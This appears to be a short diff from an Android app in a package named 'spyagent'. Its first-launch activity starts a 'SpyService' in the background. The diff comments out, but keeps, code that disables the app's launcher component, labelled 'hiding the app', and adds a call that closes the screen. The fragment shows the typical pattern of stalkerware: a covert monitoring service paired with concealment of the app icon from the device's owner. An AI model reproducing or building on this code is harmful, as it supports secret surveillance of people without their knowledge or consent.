@@ -17,9 +17,10 @@ public class FirstLaunchActivity extends Activity {
         super.onCreate(savedInstanceState);
 
         startService(new Intent(this, SpyService.class));
-
-        PackageManager p = getPackageManager();
-        p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+        finish();
+        //hiding the app
+//        PackageManager p = getPackageManager();
+//        p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 
 //        PackageManager p = getPackageManager();
 //        ComponentName componentName = new ComponentName(this, com.irodyk.spyagent.view.FirstLaunchActivity.class);
